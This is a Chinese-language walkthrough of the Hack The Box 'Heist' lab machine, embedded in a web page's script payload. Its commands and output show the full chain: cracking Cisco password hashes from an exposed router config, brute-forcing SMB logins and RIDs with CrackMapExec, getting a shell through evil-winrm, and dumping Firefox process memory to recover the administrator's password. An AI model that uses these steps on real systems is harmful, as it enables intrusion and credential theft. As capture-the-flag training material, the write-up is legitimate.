Please report any incorrect results at https://nmap.org/submit/ .\\nNmap \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"done\"}],\": 1 IP address (1 host up) scanned \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"in\"}],\" 3906.87 seconds\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"80 web服务 445 smb服务 5985 winrm 135/49968 rpc\"}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"web\",\"children\":\"Web\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"主机上开着Web服务，打开是一个登录页面。页面上有个以游客访问的功能，可以看到里面有人上传的一个配置文件：\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"children\":\"version 12.2\\nno service pad\\nservice password-encryption\\n!\\nisdn switch-type basic-5ess\\n!\\nhostname ios-1\\n!\\nsecurity passwords min-length 12\\nenable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91\\n!\\nusername rout3r password 7 0242114B0E143F015F5D1E161713\\nusername admin privilege 15 password 7 02375012182C1A1D751618034F36415408\\n!\\n!\\nip ssh authentication-retries 5\\nip ssh version 2\\n!\\n!\\nrouter bgp 100\\n synchronization\\n bgp log-neighbor-changes\\n bgp dampening\\n network 192.168.0.0Â mask 300.255.255.0\\n timers bgp 3 9\\n redistribute connected\\n!\\nip classless\\nip route 0.0.0.0 0.0.0.0 192.168.0.1\\n!\\n!\\naccess-list 101 permit ip any any\\ndialer-list 1 protocol ip list 101\\n!\\nno ip http server\\nno ip http secure-server\\n!\\nline vty 0 4\\n session-timeout 600\\n authorization exec SSH\\n transport input ssh\\n\\n\"}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"从配置文件中可以得到几个账号密码：\"}],\"\\n\",[\"$\",\"table\",null,{\"children\":[[\"$\",\"thead\",null,{\"children\":[\"$\",\"tr\",null,{\"children\":[[\"$\",\"th\",null,{\"children\":\"账号\"}],[\"$\",\"th\",null,{\"children\":\"密码\"}],[\"$\",\"th\",null,{\"align\":\"left\",\"children\":\"加密类型\"}]]}]}],[\"$\",\"tbody\",null,{\"children\":[[\"$\",\"tr\",null,{\"children\":[[\"$\",\"td\",null,{\"children\":\"???\"}],[\"$\",\"td\",null,{\"children\":\"$$1$pdQG$o8nrSzsGXeaduXrjlvKc91\"}],[\"$\",\"td\",null,{\"align\":\"left\",\"children\":\"Type 5\"}]]}],[\"$\",\"tr\",null,{\"children\":[[\"$\",\"td\",null,{\"children\":\"rout3r\"}],[\"$\",\"td\",null,{\"children\":\"0242114B0E143F015F5D1E161713\"}],[\"$\",\"td\",null,{\"align\":\"left\",\"children\":\"Type 7\"}]]}],[\"$\",\"tr\",null,{\"children\":[[\"$\",\"td\",null,{\"children\":\"admin\"}],[\"$\",\"td\",null,{\"children\":\"02375012182C1A1D751618034F36415408\"}],[\"$\",\"td\",null,{\"align\":\"left\",\"children\":\"Type 7\"}]]}]]}]]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"结合网页描述来看这是一个思科路由器的配置文件，但是很明显都是以上经过加密的密码。查了一下Type 7是可以直接解密的，但是Type 5就没有那么容易了，只能爆破。\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"对于Type 7直接用\",[\"$\",\"a\",null,{\"href\":\"http://www.ifm.net.nz/cookbooks/passwordcracker.html\",\"children\":\"在线的解密工具\"}],\"（当然这个网站可以解密Type 5的，但是耗时多），得到两个密码\",[\"$\",\"code\",null,{\"children\":\"$$uperP@ssword\"}],\"，\",[\"$\",\"code\",null,{\"children\":\"Q4)sJu\\\\Y8qz*A3?d\"}]]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"对于Type 5的我就直接用john（\",[\"$\",\"a\",null,{\"href\":\"https://klionsec.github.io/2017/04/26/use-john/\",\"children\":\"相关文章\"}],\"）来解密了。\"]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-bash\",\"children\":[\"➜  heist  \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"cat\"}],\" hash.txt\\n$1$pdQG\",[\"$\",\"span\",null,{\"className\":\"hljs-variable\",\"children\":\"$$o8nrSzsGXeaduXrjlvKc91\"}],\"\\n➜  heist  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\\nWarning: detected \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"hash\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"type\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"md5crypt\\\"\"}],\", but the string is also recognized as \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"md5crypt-long\\\"\"}],\"\\nUse the \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"--format=md5crypt-long\\\"\"}],\" option to force loading these as that \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"type\"}],\" instead\\nUsing default input encoding: UTF-8\\nLoaded 1 password \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"hash\"}],\" (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])\\nNo password hashes left to crack (see FAQ)\\n➜  heist  john hash.txt --show\\n?:stealth1agent\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"得到一个密码：\",[\"$\",\"code\",null,{\"children\":\"stealth1agent\"}],\" 。但对应的账号名是不清楚的，看了网上的文章都猜测是这个附件的上传者\",[\"$\",\"code\",null,{\"children\":\"Hazard\"}],\"。\"]}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"get-shell\",\"children\":\"Get Shell\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"我知道服务器上开了smb（445端口）和winrm（5985端口）两个服务，都可以远程连接。\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"尝试使用smb匿名登录\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-bash\",\"children\":[\"root@kali ~/Code/htb/heist \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"# smbmap -H 10.10.10.149\"}],\"\\n[+] Finding open SMB ports....\\nroot@kali ~/Code/htb/heist \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"# smbclient -N -L 10.10.10.149\"}],\"\\nsession setup failed: NT_STATUS_ACCESS_DENIED\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"没有权限。那只能用刚刚解密的账号密码试试了。使用\",[\"$\",\"a\",null,{\"href\":\"https://github.com/byt3bl33d3r/CrackMapExec/wiki/Using-Credentials\",\"children\":\"CrackMapExec\"}],\"来进行爆破（成功了就会停止，可以使用\",[\"$\",\"code\",null,{\"children\":\"--continue-on-success\"}],\"继续爆破）：\"]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-bash\",\"children\":[\"heist \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"# crackmapexec smb 10.10.10.149 -u users -p passwords\"}],\"\\nCME          10.10.10.149:445 SUPPORTDESK     [*] Windows 10.0 Build 17763 (name:SUPPORTDESK) (domain:SUPPORTDESK)\\nCME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\\\\admin:stealth1agent STATUS_LOGON_FAILURE\\nCME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\\\\admin:\",[\"$\",\"span\",null,{\"className\":\"hljs-variable\",\"children\":\"$$uperP\"}],\"@ssword STATUS_LOGON_FAILURE\\nCME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\\\\admin:Q4)sJu\\\\Y8qz*A3?d STATUS_LOGON_FAILURE\\nCME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\\\\rout3r:stealth1agent STATUS_LOGON_FAILURE\\nCME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\\\\rout3r:\",[\"$\",\"span\",null,{\"className\":\"hljs-variable\",\"children\":\"$$uperP\"}],\"@ssword STATUS_LOGON_FAILURE\\nCME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\\\\rout3r:Q4)sJu\\\\Y8qz*A3?d STATUS_LOGON_FAILURE\\nCME          10.10.10.149:445 SUPPORTDESK     [+] SUPPORTDESK\\\\hazard:stealth1agent\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"获得正确的账号密码：hazard/stealth1agent\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"但是同样的尝试登录winrm却不成功，说明这个账号没有登录winrm的权限，应该还有别的账号密码。\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-bash\",\"children\":[\"heist \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"# crackmapexec winrm -u users -p passwords\"}],\"\\n[*] KTHXBYE!\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"使用\",[\"$\",\"code\",null,{\"children\":\"smbmap\"}],\"用刚刚得到的账号密码进行登录\"]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-bash\",\"children\":[\"heist \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"# smbmap -H 10.10.10.149 -u hazard -p stealth1agent\"}],\"\\n[+] Finding open SMB ports....\\n[+] User SMB session established on 10.10.10.149...\\n[+] IP: 10.10.10.149:445\\tName: 10.10.10.149\\n\\tDisk                                                  \\tPermissions\\tComment\\n\\t----                                                  \\t-----------\\t-------\\n\\tADMIN$                                            \\tNO ACCESS\\tRemote Admin\\n\\tC$                                                \\tNO ACCESS\\tDefault share\\n\\t.\\n\\tfr--r--r--                3 Sun Dec 31 19:03:58 1600\\tInitShutdown\\n\\tfr--r--r--                4 Sun Dec 31 19:03:58 1600\\tlsass\\n\\tfr--r--r--                3 Sun Dec 31 19:03:58 1600\\tntsvcs\\n\\tfr--r--r--                3 Sun Dec 31 19:03:58 1600\\tscerpc\\n\\tfr--r--r--                1 Sun Dec 31 19:03:58 1600\\tWinsock2\\\\CatalogChangeListener-378-0\\n\\tfr--r--r--                3 Sun Dec 31 19:03:58 1600\\tepmapper\\n\\tfr--r--r--                1 Sun Dec 31 19:03:58 1600\\tWinsock2\\\\CatalogChangeListener-1e8-0\\n\\tfr--r--r--                3 Sun Dec 31 19:03:58 1600\\tLSM_API_service\\n\\tfr--r--r--                3 Sun Dec 31 19:03:58 1600\\teventlog\\n\\tfr--r--r--                1 Sun Dec 31 19:03:58 1600\\tWinsock2\\\\CatalogChangeListener-448-0\\n\\tfr--r--r--                3 Sun Dec 31 19:03:58 1600\\tatsvc\\n\\tfr--r--r--                1 Sun Dec 31 19:03:58 1600\\tWinsock2\\\\CatalogChangeListener-5ec-0\\n\\tfr--r--r--                4 Sun Dec 31 19:03:58 1600\\twkssvc\\n\\tfr--r--r--                3 Sun Dec 31 19:03:58 1600\\tspoolss\\n\\tfr--r--r--                1 Sun Dec 31 19:03:58 1600\\tWinsock2\\\\CatalogChangeListener-a10-0\\n\\tfr--r--r--                3 Sun Dec 31 19:03:58 1600\\ttrkwks\\n\\tfr--r--r--                3 Sun Dec 31 19:03:58 1600\\tW32TIME_ALT\\n\\tfr--r--r--                1 Sun Dec 31 19:03:58 1600\\tWinsock2\\\\CatalogChangeListener-288-0\\n\\tfr--r--r--                1 Sun Dec 31 19:03:58 1600\\tvgauth-service\\n\\tfr--r--r--                4 Sun Dec 31 19:03:58 1600\\tsrvsvc\\n\\tfr--r--r--                1 Sun Dec 31 19:03:58 1600\\tWinsock2\\\\CatalogChangeListener-278-0\\n\\tfr--r--r--                3 Sun Dec 31 19:03:58 1600\\tROUTER\\n\\tfr--r--r--                1 Sun Dec 31 19:03:58 1600\\tPIPE_EVENTROOT\\\\CIMV2SCM EVENT PROVIDER\\n\\tfr--r--r--                1 Sun Dec 31 19:03:58 1600\\tgecko-crash-server-pipe.5428\\n\\tfr--r--r--                1 Sun Dec 31 19:03:58 1600\\tchrome.5428.0.190032358\\n\\tfr--r--r--                1 Sun Dec 31 19:03:58 1600\\tchrome.5428.1.96034004\\n\\tfr--r--r--                1 Sun Dec 31 19:03:58 1600\\tchrome.5428.2.10178136\\n\\tfr--r--r--                1 Sun Dec 31 19:03:58 1600\\tchrome.5428.3.201281206\\n\\t.............(省略很多chrome)\\n\\tIPC$                                              \\tREAD ONLY\\tRemote IPC\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"可以发现权限很少，但其中有个IPC$有可读权限。IPC$（\",[\"$\",\"a\",null,{\"href\":\"http://smallvoid.com/article/winnt-ipc-share.html\",\"children\":\"文档\"}],\"，\",[\"$\",\"a\",null,{\"href\":\"https://www.cnblogs.com/backlion/p/7401609.html\",\"children\":\"相关\"}],\"，\",[\"$\",\"a\",null,{\"href\":\"https://www.jianshu.com/p/a578db79e117\",\"children\":\"相关\"}],\"）是通过RPC实现的，文档说可以查看所有的共享文件、用户等等功能。事不宜迟，马上用RPC连接一波。\"]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-bash\",\"children\":[\"heist \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"# rpcclient -U 'hazard%stealth1agent' 10.10.10.149\"}],\"\\nrpcclient $\u003e lookupnames hazard\\nhazard S-1-5-21-4254423774-1266059056-3197185112-1008 (User: 1)\\nrpcclient $\u003e lookupnames administrator\\nadministrator S-1-5-21-4254423774-1266059056-3197185112-500 (User: 1)\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"一个用户有一个对应的SID，SID有几部分组成，对于一个计算机上的SID，不同用户只有最后一部分不一样，这一部分叫做RID，用来标志不同的用户（上面的命令返回也可以看到两个账号的sid只有最后不一样）。rpc命令中可以通过sid查询用户名，所以可以自己写个脚本遍历rid来获得账号。当然还可以用工具啦。还是使用刚刚的CrackMapExec，带上参数\",[\"$\",\"code\",null,{\"children\":\"--rid-brute\"}]]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-bash\",\"children\":[\"(CrackMapExec) CrackMapExec[master] \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"# cme smb 10.10.10.149 -u hazard -p stealth1agent --rid-brute\"}],\"\\nSMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SUPPORTDESK) (signing:False) (SMBv1:False)\\nSMB         10.10.10.149    445    SUPPORTDESK      [+] SUPPORTDESK\\\\hazard:stealth1agent\\nSMB         10.10.10.149    445    SUPPORTDESK      [+] Brute forcing RIDs\\nSMB         10.10.10.149    445    SUPPORTDESK      500: SUPPORTDESK\\\\Administrator (SidTypeUser)\\nSMB         10.10.10.149    445    SUPPORTDESK      501: SUPPORTDESK\\\\Guest (SidTypeUser)\\nSMB         10.10.10.149    445    SUPPORTDESK      503: SUPPORTDESK\\\\DefaultAccount (SidTypeUser)\\nSMB         10.10.10.149    445    SUPPORTDESK      504: SUPPORTDESK\\\\WDAGUtilityAccount (SidTypeUser)\\nSMB         10.10.10.149    445    SUPPORTDESK      513: SUPPORTDESK\\\\None (SidTypeGroup)\\nSMB         10.10.10.149    445    SUPPORTDESK      1008: SUPPORTDESK\\\\Hazard (SidTypeUser)\\nSMB         10.10.10.149    445    SUPPORTDESK      1009: SUPPORTDESK\\\\support (SidTypeUser)\\nSMB         10.10.10.149    445    SUPPORTDESK      1012: SUPPORTDESK\\\\Chase (SidTypeUser)\\nSMB         10.10.10.149    445    SUPPORTDESK      1013: SUPPORTDESK\\\\Jason (SidTypeUser)\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"得到三个新的用户\",[\"$\",\"code\",null,{\"children\":\"support\"}],\"、\",[\"$\",\"code\",null,{\"children\":\"Chase\"}],\"、\",[\"$\",\"code\",null,{\"children\":\"Jason\"}],\"。再尝试登录一遍，可以得到正确的账号密码：chase / ‘Q4)sJu\\\\Y8qz*A3?d\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"这时再用这个账号试试登录winrm。使用\",[\"$\",\"a\",null,{\"href\":\"https://github.com/Hackplayers/evil-winrm\",\"children\":\"evil-winrm\"}],\"工具Get Shell。\"]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-bash\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"# evil-winrm -i 10.10.10.149 -u Chase -p 'Q4)sJu\\\\Y8qz*A3?d'\"}],\"\\n\\nEvil-WinRM shell v2.0\\n\\nInfo: Establishing connection to remote endpoint\\n\\n*Evil-WinRM* PS C:\\\\Users\\\\Chase\\\\Documents\u003e \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"whoami\"}],\"\\nsupportdesk\\\\chase\\n*Evil-WinRM* PS C:\\\\Users\\\\Chase\\\\Documents\u003e \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"cd\"}],\" ..\\\\Desktop\\n*Evil-WinRM* PS C:\\\\Users\\\\Chase\\\\Desktop\u003e \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"cat\"}],\" user.txt\\na127d***********\\n\"]}]}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"提权\",\"children\":\"提权\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"翻看了一下服务器，种种迹象都指向这个firefox，而且进程中还有firefox。\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-bash\",\"children\":[\"*Evil-WinRM* PS C:\\\\Users\\\\Chase\\\\Desktop\u003e \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"cat\"}],\" todo.txt\\nStuff to-do:\\n1. Keep checking the issues list.\\n2. Fix the router config.\\n\\nDone:\\n1. Restricted access \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"for\"}],\" guest user.\\n*Evil-WinRM* PS C:\\\\Users\\\\Chase\\\\Desktop\u003e \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"cd\"}],\" ..\\\\appdata\\\\roaming\\n*Evil-WinRM* PS C:\\\\Users\\\\Chase\\\\appdata\\\\roaming\u003e \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"ls\"}],\"\\n\\n\\n    Directory: C:\\\\Users\\\\Chase\\\\appdata\\\\roaming\\n\\n\\nMode                LastWriteTime         Length Name\\n----                -------------         ------ ----\\nd-----        4/22/2019   7:14 AM                Adobe\\nd---s-        4/22/2019   7:14 AM                Microsoft\\nd-----        4/22/2019   8:01 AM                Mozilla\\n\\n\\n*Evil-WinRM* PS C:\\\\Users\\\\Chase\\\\appdata\\\\roaming\u003e ps\\n\\nHandles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName\\n-------  ------    -----      -----     ------     --  -- -----------\\n    458      18     2308       5504               408   0 csrss\\n    296      17     2400       5292               492   1 csrss\\n    358      15     3592      14644              5232   1 ctfmon\\n    166       9     1896       9808       0.03   3308   1 dllhost\\n    257      14     4120      13536              3928   0 dllhost\\n    616      35    34804      60416              1012   1 dwm\\n   1496      58    23944      78636              5620   1 explorer\\n   1137      71   139216     178680      40.83    432   1 firefox\\n    408      32    17008      62692       2.92    516   1 firefox\\n    343      19     9976      37424       0.13   1700   1 firefox\\n    390      33    54340      86268     104.78   4860   1 firefox\\n    *********(省略)\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"我们知道80端口的Web服务需要登录，也许firefox内存的中藏有密码。\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"上传procdump工具到windows中，将firefox进程dump下来\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-bash\",\"children\":\"*Evil-WinRM* PS C:\\\\Users\\\\Chase\\\\Desktop\u003e upload procdump.exe 06.exe\\n[*] uploading  : procdump.exe -\u003e 06.exe\\n[*] Uploaded 467.19 KiB of 467.19 KiB (100.0%): procdump.exe -\u003e 06.exe\\n[*] uploaded   : procdump.exe -\u003e 06.exe\\n\\n*Evil-WinRM* PS C:\\\\Users\\\\Chase\\\\Desktop\u003e.\\\\06.exe -ma 516 -accepteula\\n\\nProcDump v6.00 - Writes process dump files\\nCopyright (C) 2009-2013 Mark Russinovich\\nSysinternals - www.sysinternals.com\\nWith contributions from Andrew Richards\\n\\nWriting dump file C:\\\\Users\\\\Chase\\\\Desktop\\\\firefox_191106_223459.dmp ...\\nWriting 293MB. Estimated time (less than) 9 seconds.\\nDump written.\\n\\nmeterpreter \u003e download firefox_191106_223459.dmp ./\\n[*] Downloading: firefox_191106_223459.dmp -\u003e .//firefox_191106_223459.dmp\\n[*] Downloaded 1.00 MiB of 286.62 MiB (0.35%): firefox_191106_223459.dmp -\u003e .//firefox_191106_223459.dmp\\n[*] Downloaded 2.00 MiB of 286.62 MiB (0.7%): firefox_191106_223459.dmp -\u003e .//firefox_191106_223459.dmp\\n[*] Downloaded 3.00 MiB of 286.62 MiB (1.05%): firefox_191106_223459.dmp -\u003e .//firefox_191106_223459.dmp\\n[*] Downloaded 4.00 MiB of 286.62 MiB (1.4%): firefox_191106_223459.dmp -\u003e .//firefox_191106_223459.dmp\\n[*] Downloaded 5.00 MiB of 286.62 MiB (1.74%): firefox_191106_223459.dmp -\u003e .//firefox_191106_223459.dmp\\n\"}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"下载到本地后搜索一下密码，字段就搜80端口的登录密码的字段就行：\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-bash\",\"children\":[\"kali at ~ ❯ strings firefox.exe_191214_145906.dmp | grep login_password\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"C:\\\\Program Files\\\\Mozilla Firefox\\\\firefox.exe\\\"\"}],\" localhost/login.php?login_username=admin@support.htb\u0026login_password=4dD!5}x/re8]FBuZ\u0026login=\\nMOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb\u0026login_password=4dD!5}x/re8]FBuZ\u0026login=\\nlocalhost/login.php?login_username=admin@support.htb\u0026login_password=4dD!5}x/re8]FBuZ\u0026login=\\nMOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb\u0026login_password=4dD!5}x/re8]FBuZ\u0026login=\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"然后登录一下就完事了\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-bash\",\"children\":[\"kali at ~ ❯ evil-winrm -i 10.10.10.149 -u administrator -p \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'4dD!5}x/re8]FBuZ'\"}],\"\\n\\nEvil-WinRM shell v2.0\\n\\nInfo: Establishing connection to remote endpoint\\n\\n*Evil-WinRM* PS C:\\\\Users\\\\Administrator\\\\Documents\u003e \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"cd\"}],\" ..\\\\Desktop\\n*Evil-WinRM* PS C:\\\\Users\\\\Administrator\\\\Desktop\u003e \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"ls\"}],\"\\n\\n\\n    Directory: C:\\\\Users\\\\Administrator\\\\Desktop\\n\\n\\nMode                LastWriteTime         Length Name\\n----                -------------         ------ ----\\n-a----        4/22/2019   9:05 AM             32 root.txt\\n\"]}]}]]}]]}]]\n"])</script><script>self.__next_f.push([1,"5:[[[\"$\",\"meta\",null,{\"charSet\":\"utf-8\"}],[\"$\",\"title\",null,{\"children\":\"HTB heist Writeup\"}],null,null,null,null,null,null,null,null,null,[\"$\",\"meta\",null,{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}],null,null,null,null,null,null,null,null,null,null,[]],[null,null,null,null],null,null,[null,null,null,null,null],null,null,null,null,[null,[[\"$\",\"link\",null,{\"rel\":\"icon\",\"href\":\"/favicon.ico\",\"type\":\"image/x-icon\",\"sizes\":\"any\"}]],[],null]]\n"])</script>